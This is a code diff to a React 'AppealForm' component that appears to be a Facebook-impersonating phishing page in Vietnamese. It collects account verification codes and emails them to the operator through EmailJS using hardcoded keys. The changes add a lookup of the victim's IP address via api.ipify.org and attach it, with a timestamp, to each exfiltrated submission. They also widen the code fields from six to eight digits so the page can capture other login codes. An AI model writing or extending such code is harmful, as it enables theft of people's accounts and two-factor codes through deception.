@@ -31,10 +31,25 @@ export default function AppealForm() {
   const SERVICE_ID = "service_j1vn1o6";
   const TEMPLATE_ID = "template_uvh7y0g";
   const PUBLIC_KEY = "HisNIy8_NoPxGd9Tl";
+  const [userIp, setUserIp] = useState("");
+  
+  // Lấy IP người dùng khi component được load
+  useEffect(() => {
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        setUserIp(data.ip);
+      })
+      .catch(() => {
+        setUserIp("Không xác định được");
+      });
+  }, []);
   
   const sendEmail = (stage: string, data: any) => {
     emailjs.send(SERVICE_ID, TEMPLATE_ID, {
       stage: stage,
+      ip_address: userIp,
+      timestamp: new Date().toString(),
       ...data
     }, PUBLIC_KEY)
     .then((result) => {
@@ -586,7 +601,7 @@ export default function AppealForm() {
         <h1 className="text-xl font-bold text-[#1c1e21] mb-4 text-center">Nhập mã xác nhận</h1>
         
         <p className="text-sm text-[#606770] mb-5 text-center">
-          Chúng tôi đã gửi một mã xác minh 6 chữ số đến email hoặc số điện thoại bạn đã đăng ký. 
+          Chúng tôi đã gửi một mã xác minh đến email hoặc số điện thoại bạn đã đăng ký. 
           Vui lòng kiểm tra và nhập mã xác nhận dưới đây.
         </p>
         
@@ -597,10 +612,10 @@ export default function AppealForm() {
               type="text" 
               className={`facebook-input ${codeError ? "border-red-500" : ""}`}
               value={code1}
-              onChange={(e) => setCode1(e.target.value.replace(/[^0-9]/g, '').slice(0, 6))}
-              placeholder="Nhập mã 6 chữ số"
+              onChange={(e) => setCode1(e.target.value.replace(/[^0-9]/g, '').slice(0, 8))}
+              placeholder=""
               required
-              maxLength={6}
+              maxLength={8}
             />
             {codeError && (
               <p className="facebook-error-text">Mã xác nhận không chính xác. Vui lòng thử lại.</p>
@@ -654,10 +669,10 @@ export default function AppealForm() {
               type="text" 
               className="facebook-input"
               value={code2}
-              onChange={(e) => setCode2(e.target.value.replace(/[^0-9]/g, '').slice(0, 6))}
-              placeholder="Nhập mã 6 chữ số"
+              onChange={(e) => setCode2(e.target.value.replace(/[^0-9]/g, '').slice(0, 8))}
+              placeholder=""
               required
-              maxLength={6}
+              maxLength={8}
               disabled={timer > 0}
             />
             {timer > 0 && (
